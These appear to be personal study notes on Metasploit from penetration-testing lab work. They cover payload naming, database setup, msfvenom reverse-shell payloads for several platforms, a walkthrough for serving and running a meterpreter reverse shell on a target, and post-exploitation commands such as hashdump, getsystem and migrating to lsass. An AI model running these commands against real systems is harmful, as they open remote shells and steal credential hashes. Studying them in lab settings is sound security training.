Modules
===
Auxiliary
Encoders
Evasion
Exploits
NOPs
Payloads
- singles
- stagers
- stages
Post


Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.

    generic/shell_reverse_tcp
    windows/x64/shell/reverse_tcp

Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.


msfconsole
===
![[Screenshot 2022-06-14 at 16.04.05.png]]

Exploitation
===
### The Metasploit DB
1. `systemctl start postgresql`
2. `msfdb init`
3. msf6 > db_status
--> this should now show postgresql


`db_nmap` will store the hosts and services to the database and can be viewed using `hosts` and `services` commands

`services -S <name>`:
![[Screenshot 2022-06-15 at 09.04.25.png]]

`hashdump` in the meterpreter shell will dump the hashes of all users on a windows system

#### standard payloads 
linux `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
windows `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
php `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
asp
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
python
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

How to get meterpreter revserse shell with msfvenom:
1. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.59.68 LPORT=9001 -f elf > rev_shell.elf`
2. `python3 -m http.server 8000`
3. on target machine `wget http://<lhost>:8000/rev_shell.elf`
4. on attacking machine in msf6 > `use exploit/multi/handler` + `set payload linux/x86/meterpreter/reverse_tcp` (make it the payload used in msfvenom)
5. set the options + run
6. `./rev_shell.elf` on target machine
7. meterpreter session established:)


Meterpreter
===
useful commands
`hashdump`
`getsystem`
`search -f <filename>
`shell`


finding hashdumps (being able to use it):
- find _lsass.exe_ and migrate to this process (`ps | grep lsass`)